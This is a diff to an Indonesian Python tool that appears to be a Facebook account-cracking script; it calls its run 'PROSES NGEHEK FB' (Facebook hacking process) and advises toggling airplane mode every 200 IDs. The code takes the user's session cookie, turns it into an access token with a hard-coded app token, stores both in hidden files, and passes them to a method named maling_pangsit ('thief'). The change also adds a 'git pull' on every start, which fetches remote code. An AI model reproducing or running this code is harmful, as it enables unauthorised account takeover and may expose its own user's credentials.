@@ -89,7 +89,7 @@ class Login:
                 tokz = self.ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
                 self.maling_pangsit(cok, tokz["access_token"])
                 open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(tokz["access_token"])
-                exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python log.py")
+                exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python ASU.py")
             else:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()
         except requests.exceptions.ConnectionError:prints(Panel("😭[bold red] Tidak ada koneksi internet", style="bold white", width=70));exit()
         except (KeyError,AttributeError):prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.login_cokie()
@@ -112,7 +112,7 @@ class Login:
             gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
             date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
             self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
-            prints(Panel("😍 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python log.py[/]", style="bold white", width=70));exit()
+            prints(Panel("😍 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python ASU.py[/]", style="bold white", width=70));exit()
         except:exit()
 
     def maling_pangsit(self, cok, tok):
@@ -602,4 +602,6 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
         self.lo+=1
 
 
+os.system("clear")
+os.system("git pull")
 Login()
